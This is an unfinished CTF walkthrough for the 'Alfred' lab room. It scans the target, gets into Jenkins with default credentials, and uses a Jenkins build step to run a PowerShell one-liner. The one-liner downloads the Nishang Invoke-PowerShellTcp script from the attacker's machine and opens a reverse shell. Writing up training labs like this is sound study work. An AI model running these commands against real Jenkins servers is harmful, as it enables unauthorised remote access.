***STILL IN THE WORKS!***


Room: Alfred

Difficulty:

Overview:

------------------------------------------------------------------------------------------------------------------------------------------------------------------

First we need to scan for all open ports using nmap, but since the machine doesn't respond to ping (ICMP) we need to adjust the scan:

```
nmap  -Pn -A -p- 10.10.101.250 -T4

-Pn   → Because the machine don't respond to ping
-A    → Enable OS detection, version detection, script scanning, and traceroute
-p-   → Scan all ports
-T4   → To speed the scan (this loses some accuracy), otherwise it would take more time to complete.
```

![Alfred_nmap_scan](https://user-images.githubusercontent.com/76821053/118020693-4ae2cd80-b352-11eb-8f5c-5e8250883d63.png)

The http at port 8080 hosted a jenkins server. We can try default credentials and this one was pretty simple.

![jenkins_8080](https://user-images.githubusercontent.com/76821053/118023732-c8f4a380-b355-11eb-8ea8-ee409d9ddc01.png)

We can created a new project inside Jenkins. At configurations we have a field called Build that let us do commands, so we can use the powershell command given by the room:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

In my case i used the below command, where i change the ip and port to match my machine.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.23.202:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.23.202 -Port 9001
```

To breakdown this command we can tell that the first part of the command will download a file from a specific website or server, in this case from my kali machine and the 
second part of the command tells the windows machine to execute it in order for us to get a reverse shell.

For this command to work and get a reverse shell on our machine we need to setup a few things:

-- Download Nishang "Invoke-PowerShellTcp.ps1" payload script provided by the room. Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security.

-- A python SimpleHTTPServer in order to host the file to each the remote machine will try to donwload. We can do this by typing this command on a kali machine:

**python -m SimpleHTTPServer**

![pythonserver](https://user-images.githubusercontent.com/76821053/118032170-3fe26a00-b35f-11eb-919e-8483e5469701.png)

-- Start a netcat listener on the port we chose:

![nclistener](https://user-images.githubusercontent.com/76821053/118028995-9c438a80-b35b-11eb-8463-7b4c797b97d2.png)

After setting all up we just start a new project on jenkins server (in my case i called it admin), add the command to the build tab and just run it:   

![jenkinsproject](https://user-images.githubusercontent.com/76821053/118030688-88992380-b35d-11eb-89a6-74a434f02cb0.png)

We can see that the remote machine downloads the script and run it:

![pythonhttpserver](https://user-images.githubusercontent.com/76821053/118028046-85e8ff00-b35a-11eb-8d9c-32d510ae7b57.png)
